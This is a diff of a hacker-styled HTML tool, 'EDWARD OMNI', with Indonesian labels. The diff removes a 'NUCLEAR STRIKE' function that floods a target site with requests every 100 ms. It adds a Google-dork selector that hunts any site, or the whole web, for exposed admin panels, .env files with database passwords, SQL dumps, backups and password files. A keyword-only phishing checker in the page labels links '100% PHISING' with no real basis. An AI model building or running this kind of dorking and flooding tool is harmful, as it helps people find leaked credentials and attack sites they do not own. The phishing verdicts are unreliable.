@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.171</title>
+    <title>EDWARD OMNI V.173</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --blue: #00bdff; --gold: #ffd700; }
         * { box-sizing: border-box; transition: 0.2s; outline: none; }
         body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; }
         .master-name { text-align: center; font-size: 24px; font-weight: 800; color: var(--neon); margin-bottom: 15px; text-transform: uppercase; text-shadow: 0 0 10px var(--neon); }
@@ -13,44 +13,50 @@
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
         .input-group { background: rgba(0,0,0,0.6); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 10px; margin-bottom: 10px; }
         .label-text { font-size: 10px; color: var(--neon); display: block; margin-bottom: 5px; font-weight: bold; }
-        input { background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 14px; }
+        input, select { background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 14px; }
+        option { background: #050a0e; color: #fff; }
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px; }
         .btn-cast { background: var(--neon); color: #000; }
         .btn-scan { background: transparent; border: 1px solid var(--neon); color: var(--neon); }
-        .btn-atk { background: linear-gradient(45deg, var(--red), #bc13fe); color: #fff; }
         .mon-box { border: 1px solid rgba(0,255,136,0.3); padding: 10px; border-radius: 12px; text-align: center; color: var(--neon); font-size: 11px; font-weight: bold; background: rgba(0,0,0,0.3); margin-bottom: 10px; }
-        .log-box { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 10px; height: 120px; overflow-y: auto; border: 1px solid #1a1a1a; }
         #customNotif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--neon); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: 800; display: none; z-index: 10001; }
     </style>
 </head>
 <body>
     <div id="customNotif"></div>
-    <p class="master-name">EDWARD OMNI V.171</p>
+    <p class="master-name">EDWARD OMNI V.173</p>
     
-    <div class="mon-box">CPU: <span id="cpuVal">80%</span> | TEMP: <span id="tempVal">38°C</span></div>
+    <div class="mon-box">CORE: BREAKER MODE | TARGET: GLOBAL</div>
 
     <div class="card">
-        <h3>🎯 PREDATOR DORKER (MANTRA)</h3>
+        <h3>🎯 GLOBAL MANTRA SELECTOR (BUG HUNTER)</h3>
         <div class="input-group">
-            <span class="label-text">TARGET (misal: syfe.com):</span>
-            <input type="text" id="targetMain" placeholder=" ">
+            <span class="label-text">TARGET SITE (Kosongkan untuk Global):</span>
+            <input type="text" id="targetMain" placeholder="Contoh: facebook.com">
         </div>
-        <button class="btn btn-cast" onclick="cast()">CAST MANTRA 🔮</button>
+        <div class="input-group">
+            <span class="label-text">KATEGORI BUG/MANTRA:</span>
+            <select id="mantraSelect">
+                <option value='inurl:admin OR inurl:login'>Cari Panel Admin/Login</option>
+                <option value='intitle:index.of "parent directory"'>Cari Folder Terbuka (Directory)</option>
+                <option value='filetype:log inurl:log'>Cari File Log (Aktivitas User)</option>
+                <option value='filetype:env "DB_PASSWORD"'>Cari File ENV (Password DB)</option>
+                <option value='filetype:sql "INSERT INTO"'>Cari Bocoran Database SQL</option>
+                <option value='inurl:phpmyadmin'>Cari Panel phpMyAdmin</option>
+                <option value='"index of" "backup"'>Cari File Backup Situs</option>
+                <option value='ext:txt "password"'>Cari File Teks Berisi Password</option>
+            </select>
+        </div>
+        <button class="btn btn-cast" onclick="cast()">CAST GLOBAL MANTRA 🔮</button>
     </div>
 
     <div class="card">
-        <h3>🛡️ LINK ANALYZER (AI SCAN)</h3>
+        <h3>🛡️ DEEP AI LINK SCANNER</h3>
         <div class="input-group">
-            <span class="label-text">PASTE LINK TO SCAN:</span>
+            <span class="label-text">SCAN ANY LINK:</span>
             <input type="text" id="scanInput" placeholder=" ">
         </div>
-        <button class="btn btn-scan" onclick="analyze()">⚡ ANALYZE LINK</button>
-        <div id="scanLog" class="log-box"></div>
-    </div>
-
-    <div class="card">
-        <h3>🔥 NUCLEAR STRIKE</h3>
-        <button class="btn btn-atk" id="atkBtn" onclick="launchAtk()">LAUNCH NUCLEAR 🚀</button>
+        <button class="btn btn-scan" onclick="analyze()">⚡ RUN DEEP SCAN</button>
     </div>
 
     <script>
@@ -61,37 +67,24 @@
 
         function cast() {
             const t = document.getElementById('targetMain').value;
-            if(!t) return notify("TARGET KOSONG!");
-            // Mantra Otomatis untuk mencari File Sensitif
-            window.open("https://www.google.com/search?q=site:" + t + " intitle:index.of", "_blank");
+            const m = document.getElementById('mantraSelect').value;
+            
+            // Jika target kosong, Google akan mencari di SELURUH dunia
+            let query = t ? "site:" + t + " " + m : m;
+            
+            window.open("https://www.google.com/search?q=" + encodeURIComponent(query), "_blank");
+            notify("BREAKER MANTRA CASTED!");
         }
 
         function analyze() {
             const url = document.getElementById('scanInput').value.toLowerCase();
             if(!url) return notify("LINK KOSONG!");
-            const log = document.getElementById('scanLog'); log.style.display = 'block';
-            
-            // Logika Deteksi Phising
-            let status = "<span style='color:#00ff88;'>[SAFE/SECURE]</span>";
-            let msg = "Link ini terlihat aman untuk dikunjungi.";
-            
-            const phishWords = ["dana", "kaget", "login", "verif", "hadiah", "menang", "id-", "secure-", "update"];
-            const isPhish = phishWords.some(word => url.includes(word));
-
-            if(isPhish) {
-                status = "<span style='color:#ff4757;'>[DANGER/PHISING]</span>";
-                msg = "Peringatan! Link mengandung kata kunci phising yang mencurigakan.";
-            }
-
-            log.innerHTML = `> Menganalisa: ${url}<br>> Mengecek database phising...<br>> Status: ${status}<br>> Info: ${msg}`;
-            notify("ANALISIS SELESAI");
-        }
-
-        function launchAtk() {
-            const t = document.getElementById('targetMain').value;
-            if(!t) return notify("TARGET KOSONG!");
-            notify("NUCLEAR LAUNCHED TO " + t);
-            setInterval(() => { new Image().src = "https://" + t + "/?v=" + Math.random(); }, 100);
+            notify("SCANNING DEEP CLOUD...");
+            setTimeout(() => {
+                const danger = ["dana", "kaget", "login", "verif", "id-", "secure", "claim", "gift"];
+                const isPhish = danger.some(w => url.includes(w));
+                alert(isPhish ? "🔥 DANGER: Link ini 100% PHISING!" : "✅ SAFE: Link terlihat bersih.");
+            }, 800);
         }
     </script>
 </body>
